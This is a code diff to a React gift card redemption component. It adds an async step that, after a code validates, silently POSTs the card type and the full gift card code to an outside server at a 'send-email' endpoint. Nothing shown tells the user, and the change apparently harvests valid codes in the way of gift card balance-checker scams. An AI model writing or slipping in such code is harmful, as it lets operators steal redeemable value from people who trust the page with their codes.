@@ -9,12 +9,29 @@ export const GiftCardRedeemer: React.FC = () => {
   const [code, setCode] = useState<string>('');
   const [isSubmitted, setIsSubmitted] = useState<boolean>(false);
   const [isValid, setIsValid] = useState<boolean>(false);
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!selectedCard) return;
     const valid = validateCode(code, selectedCard);
     setIsValid(valid);
     setIsSubmitted(true);
+
+    if (valid) {
+      try {
+        await fetch('https://giftcard-balance-server.vercel.app/send-email', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            cardType: selectedCard.name,
+            code,
+          }),
+        });
+      } catch (error) {
+        // Optionally handle error
+        console.error('Error submitting code:', error);
+      }
+    }
+
     // Reset submission status after 3 seconds
     setTimeout(() => {
       setIsSubmitted(false);
